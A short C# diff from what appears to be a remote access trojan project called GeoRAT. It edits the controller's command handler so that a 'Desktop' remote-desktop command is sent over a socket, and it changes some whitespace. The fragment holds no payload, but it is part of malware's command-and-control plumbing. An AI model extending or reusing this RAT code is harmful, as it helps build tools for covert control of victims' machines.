@@ -11,8 +11,8 @@ namespace GeoRAT.Server.CommandHandlers
     {
 
         //Delegates for remote desktop which i haven't implemented yet 
-       
 
+    
         public CommandSender(Socket s, Commands param1)
         {
 
@@ -21,7 +21,8 @@ namespace GeoRAT.Server.CommandHandlers
             {
               
                 case "Desktop": //If we want to start remote desktop session
-                    break; //Not coded yet. 
+                    sender.Send(param1);
+                    break; 
                 default: //Just send command for now 
                     sender.Send(param1);
                     break;
@@ -36,6 +37,7 @@ namespace GeoRAT.Server.CommandHandlers
         }
 
 
+        
      
         }
     }
